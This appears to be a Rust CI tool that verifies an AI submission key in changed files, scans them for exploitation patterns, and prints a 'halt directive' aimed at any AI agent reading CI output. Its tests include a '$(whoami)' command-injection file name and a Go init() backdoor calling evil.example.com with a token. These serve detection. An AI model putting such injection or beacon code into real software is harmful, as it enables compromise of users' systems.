// AIKEY-l4qkxonqry2b4gj7bsrkqpryiy
//! CI entrypoint: verify the AI submission key in every changed file and run
//! the RASP scanner to detect active exploitation patterns.
//!
//! Exit codes:
//!   0 — all checks passed (or no key was set at the anchor commit)
//!   1 — one or more files failed the check (AI-content or RASP alert)
//!   2 — unrecoverable error (bad environment, git failure, etc.)

use std::path::{Path, PathBuf};
use std::process::ExitCode;

use aiscan::{Detection, RaspAlert, RaspScanner, Severity};
use env_traits::{AiEnv, FileEnv, GitEnv};

/// Halt directive embedded at compile time.  The file has a context-framing
/// preamble for agents that encounter it during normal codebase exploration;
/// strip it at the sentinel so only the live directive reaches the output.
const HALT_PROMPT_RAW: &str = include_str!("halt_prompt.md");
const HALT_DIRECTIVE_SENTINEL: &str = "<!-- HALT_DIRECTIVE_START -->\n";

fn halt_prompt() -> &'static str {
    match HALT_PROMPT_RAW.find(HALT_DIRECTIVE_SENTINEL) {
        Some(pos) => &HALT_PROMPT_RAW[pos + HALT_DIRECTIVE_SENTINEL.len()..],
        None      => HALT_PROMPT_RAW, // sentinel missing — emit whole file
    }
}

/// Well-known binary / non-text file extensions to skip.
const SKIP_EXTENSIONS: &[&str] = &[
    ".png", ".jpg", ".jpeg", ".gif", ".webp", ".ico", ".bmp",
    ".pdf", ".zip", ".tar", ".gz", ".bz2", ".xz", ".7z",
    ".wasm", ".bin", ".exe", ".dll", ".so", ".dylib",
    ".mp3", ".mp4", ".wav", ".ogg", ".flac",
    ".ttf", ".otf", ".woff", ".woff2",
    ".lock",
];

/// Returns `true` for binary or very short files that should not be scanned.
pub fn should_skip(path: &str, content: &[u8]) -> bool {
    if content.len() < 32 {
        return true;
    }
    // Null-byte check on the first 512 bytes.
    let head = &content[..content.len().min(512)];
    if head.contains(&0u8) {
        return true;
    }
    let lower = path.to_lowercase();
    SKIP_EXTENSIONS.iter().any(|ext| lower.ends_with(ext))
}

/// Core logic.  Returns the process exit code.
pub fn run<F, G, A>(file: &F, git: &G, ai: &A) -> ExitCode
where
    F: FileEnv,
    G: GitEnv,
    A: AiEnv + ?Sized,
    F::Error: Send + Sync + 'static,
    G::Error: Send + Sync + 'static,
    A::Error: core::fmt::Display,
{
    // 1. Resolve repo root.
    let repo_root_str = match git.repo_root() {
        Ok(r) => r,
        Err(e) => {
            eprintln!("check-ai-key: cannot determine repo root: {e}");
            return ExitCode::from(2);
        }
    };
    let repo_root = Path::new(&repo_root_str);

    // 2. Resolve anchor commit.
    let anchor = match keyguard::base_commit(file, git, &repo_root) {
        Ok(a) => a,
        Err(e) => {
            eprintln!("check-ai-key: cannot resolve base commit: {e}");
            return ExitCode::from(2);
        }
    };
    let anchor = match anchor {
        Some(a) => a,
        None => {
            println!("check-ai-key: no anchor commit (orphan/initial); skipping.");
            return ExitCode::SUCCESS;
        }
    };
    println!("check-ai-key: anchor commit: {anchor}");

    // 3. Read expected key at the anchor commit.
    let key = match keyguard::read_key_at_commit(git, &repo_root, &anchor) {
        Ok(k) => k,
        Err(e) => {
            eprintln!("check-ai-key: cannot read key at anchor commit: {e}");
            return ExitCode::from(2);
        }
    };
    let key = match key {
        Some(k) => k,
        None => {
            println!("check-ai-key: no key at anchor commit {anchor}; skipping.");
            return ExitCode::SUCCESS;
        }
    };
    println!("check-ai-key: expected key: {key}");

    // 4. Determine changed files.
    let files = match keyguard::changed_files(git, &repo_root, &anchor) {
        Ok(f) => f,
        Err(e) => {
            eprintln!("check-ai-key: cannot determine changed files: {e}");
            return ExitCode::from(2);
        }
    };
    if files.is_empty() {
        println!("check-ai-key: no changed files.");
        return ExitCode::SUCCESS;
    }
    println!("check-ai-key: checking {} file(s)…", files.len());

    let rasp = RaspScanner;
    let mut detections: Vec<Detection> = Vec::new();

    // 5. RASP-scan ALL changed files (including key-bearing ones — a malicious
    //    agent can trivially include the key to pass the AI scan).
    let mut missing: Vec<String> = Vec::new();
    for rel in &files {
        let abs: PathBuf = repo_root.join(rel);
        let content = match file.read_file(&abs.to_string_lossy()) {
            Ok(c) => c,
            Err(_) => continue,
        };
        if should_skip(rel, &content) {
            println!("check-ai-key:   skip  {rel} (binary or too short)");
            continue;
        }

        // RASP scan.
        for alert in rasp.scan_file(rel, &content) {
            println!(
                "check-ai-key:   RASP  {rel} [{} {}]  {}",
                alert.severity, alert.kind, alert.detail
            );
            detections.push(Detection::RaspAlert(alert));
        }

        // Key-presence scan.
        let has_key = String::from_utf8_lossy(&content).contains(&key);
        if !has_key {
            detections.push(Detection::MissingKey { path: rel.clone() });
            missing.push(rel.clone());
        }
    }

    // 6. AI-scan files that lack the key.
    if missing.is_empty() && detections.iter().all(|d| matches!(d, Detection::RaspAlert(_))) {
        // All missing-key detections are absent; only RASP (if any).
    } else {
        for rel in &missing {
            let abs: PathBuf = repo_root.join(rel);
            let content = match file.read_file(&abs.to_string_lossy()) {
                Ok(c) => c,
                Err(_) => continue,
            };
            if should_skip(rel, &content) {
                continue;
            }
            match ai.scan(&abs.to_string_lossy(), &content) {
                Err(e) => {
                    println!("check-ai-key:   warn  {rel}: scanner error: {e}");
                }
                Ok((likely, confidence)) => {
                    if likely {
                        println!(
                            "check-ai-key:   FAIL  {rel} (AI confidence {:.0}%)",
                            confidence * 100.0
                        );
                        detections.push(Detection::AiContent {
                            path: rel.clone(),
                            confidence,
                        });
                    } else {
                        println!(
                            "check-ai-key:   pass  {rel} (AI confidence {:.0}%)",
                            confidence * 100.0
                        );
                    }
                }
            }
        }
    }

    // 7. Display report and decide exit code.
    display_report(&detections, &key)
}

/// Print a grouped summary of all detections and return the appropriate exit code.
fn display_report(detections: &[Detection], key: &str) -> ExitCode {
    let failures: Vec<&Detection> = detections.iter().filter(|d| d.is_failure()).collect();

    if failures.is_empty() {
        // There may be MissingKey-only informational entries.
        let missing_only: Vec<&Detection> = detections
            .iter()
            .filter(|d| matches!(d, Detection::MissingKey { .. }))
            .collect();
        if missing_only.is_empty() {
            println!("check-ai-key: all checks passed. ✓");
        } else {
            println!(
                "check-ai-key: {} file(s) missing key but AI scan clean — human code is fine. ✓",
                missing_only.len()
            );
        }
        return ExitCode::SUCCESS;
    }

    // Partition by category for display.
    let rasp_critical: Vec<&RaspAlert> = failures
        .iter()
        .filter_map(|d| {
            if let Detection::RaspAlert(a) = d {
                (a.severity >= Severity::High).then_some(a)
            } else {
                None
            }
        })
        .collect();

    let rasp_lower: Vec<&RaspAlert> = failures
        .iter()
        .filter_map(|d| {
            if let Detection::RaspAlert(a) = d {
                (a.severity < Severity::High).then_some(a)
            } else {
                None
            }
        })
        .collect();

    let ai_flagged: Vec<&Detection> = failures
        .iter()
        .filter(|d| matches!(d, Detection::AiContent { .. }))
        .copied()
        .collect();

    eprintln!("\n╔══════════════════════════════════════════════════════════════╗");
    eprintln!("║           check-ai-key: SECURITY CHECK FAILED               ║");
    eprintln!("╚══════════════════════════════════════════════════════════════╝\n");

    if !rasp_critical.is_empty() {
        eprintln!(
            "🚨  RASP — {} HIGH/CRITICAL exploitation pattern(s) detected:\n",
            rasp_critical.len()
        );
        for a in &rasp_critical {
            eprintln!(
                "  [{}] {}  —  {}",
                a.severity, a.kind, a.path
            );
            eprintln!("       {}", a.detail);
        }
        eprintln!();
        // Emit the halt directive so any AI agent reading this output receives it.
        eprintln!("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
        eprintln!("{}", halt_prompt());
        eprintln!("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n");
    }

    if !rasp_lower.is_empty() {
        eprintln!(
            "⚠️   RASP — {} MEDIUM/LOW exploitation pattern(s):\n",
            rasp_lower.len()
        );
        for a in &rasp_lower {
            eprintln!("  [{}] {}  —  {}", a.severity, a.kind, a.path);
            eprintln!("       {}", a.detail);
        }
        eprintln!();
    }

    if !ai_flagged.is_empty() {
        eprintln!(
            "❌  AI content — {} file(s) appear AI-generated without a submission key:\n",
            ai_flagged.len()
        );
        eprintln!("  Expected key: {key}\n");
        eprintln!("  To fix: embed the key (from key.agents_.md) in each flagged file.\n");
        for d in &ai_flagged {
            if let Detection::AiContent { path, confidence } = d {
                eprintln!("  {} (confidence {:.0}%)", path, confidence * 100.0);
            }
        }
        eprintln!();
    }

    ExitCode::from(1)
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use env_fake::{FakeAiEnv, FakeFileEnv, FakeGitEnv};

    const KEY: &str = "AIKEY-testkey234abc";
    const KEY_CONTENT: &[u8] = b"# AI Submission Key\n\nKey: AIKEY-testkey234abc\n";

    fn base_git() -> FakeGitEnv {
        FakeGitEnv::default()
            .with_repo_root("/repo")
            .with_rev("HEAD^", "anchor")
            .with_show_file("anchor", "key.agents_.md", KEY_CONTENT)
            .with_changed_files(vec!["src/lib.rs".into()])
    }

    #[test]
    fn all_files_have_key_passes() {
        let content = format!("// {KEY}\nfn main() {{}}");
        let file = FakeFileEnv::default().with_file("/repo/src/lib.rs", content.as_bytes());
        let git  = base_git();
        let ai   = FakeAiEnv::default().always(false, 0.0);
        assert_eq!(run(&file, &git, &ai), ExitCode::SUCCESS);
    }

    #[test]
    fn missing_key_not_ai_passes() {
        let file = FakeFileEnv::default()
            .with_file("/repo/src/lib.rs", b"fn main() {}");
        let git  = base_git();
        let ai   = FakeAiEnv::default().always(false, 0.1);
        assert_eq!(run(&file, &git, &ai), ExitCode::SUCCESS);
    }

    #[test]
    fn missing_key_and_ai_flagged_fails() {
        let content = b"fn main() { /* padding to exceed the 32 byte minimum threshold */ }";
        let file = FakeFileEnv::default()
            .with_file("/repo/src/lib.rs", content.as_ref());
        let git  = base_git();
        let ai   = FakeAiEnv::default().always(true, 0.9);
        assert_eq!(run(&file, &git, &ai), ExitCode::from(1));
    }

    #[test]
    fn orphan_commit_skips_check() {
        let file = FakeFileEnv::default();
        let git  = FakeGitEnv::default().with_repo_root("/repo");
        let ai   = FakeAiEnv::default().always(true, 0.99);
        assert_eq!(run(&file, &git, &ai), ExitCode::SUCCESS);
    }

    #[test]
    fn rasp_shell_injection_fails_even_with_key() {
        // File contains the key but has a shell injection in the path — RASP
        // should catch it regardless.
        let content = format!(
            "// {KEY}\nfn main() {{ /* padding past 32 bytes to prevent early skip */ }}"
        );
        let git = FakeGitEnv::default()
            .with_repo_root("/repo")
            .with_rev("HEAD^", "anchor")
            .with_show_file("anchor", "key.agents_.md", KEY_CONTENT)
            .with_changed_files(vec!["src/$(whoami).rs".into()]);
        let file = FakeFileEnv::default()
            .with_file("/repo/src/$(whoami).rs", content.as_bytes());
        let ai   = FakeAiEnv::default().always(false, 0.0);
        assert_eq!(run(&file, &git, &ai), ExitCode::from(1));
    }

    #[test]
    fn rasp_go_init_backdoor_fails() {
        let content = format!(
            "// {KEY}\npackage main\n\nfunc init() {{\n    http.Get(\"https://evil.example.com/c2?t=\" + \"tok\")\n}}"
        );
        let git = FakeGitEnv::default()
            .with_repo_root("/repo")
            .with_rev("HEAD^", "anchor")
            .with_show_file("anchor", "key.agents_.md", KEY_CONTENT)
            .with_changed_files(vec!["cmd/main.go".into()]);
        let file = FakeFileEnv::default()
            .with_file("/repo/cmd/main.go", content.as_bytes());
        let ai   = FakeAiEnv::default().always(false, 0.0);
        assert_eq!(run(&file, &git, &ai), ExitCode::from(1));
    }

    #[test]
    fn should_skip_binary_file() {
        let mut content = vec![1u8; 100];
        content[10] = 0;
        assert!(should_skip("foo.rs", &content));
    }

    #[test]
    fn should_skip_short_file() {
        assert!(should_skip("foo.rs", b"short"));
    }

    #[test]
    fn should_skip_known_extension() {
        assert!(should_skip("image.png", &vec![0x89u8; 100]));
    }
}

fn main() -> ExitCode {
    use aiscan::{build_ai_env, AiEnvConfig};
    use env_real::{OsFileEnv, ProcessGitEnv, ReqwestNetworkEnv};

    let file    = OsFileEnv;
    let git     = ProcessGitEnv;
    let config  = AiEnvConfig::from_env();
    let network = ReqwestNetworkEnv;
    let ai = match build_ai_env(config, network) {
        Ok(a) => a,
        Err(e) => {
            eprintln!("check-ai-key: cannot build AI scanner: {e}");
            return ExitCode::from(2);
        }
    };
    run(&file, &git, &*ai)
}
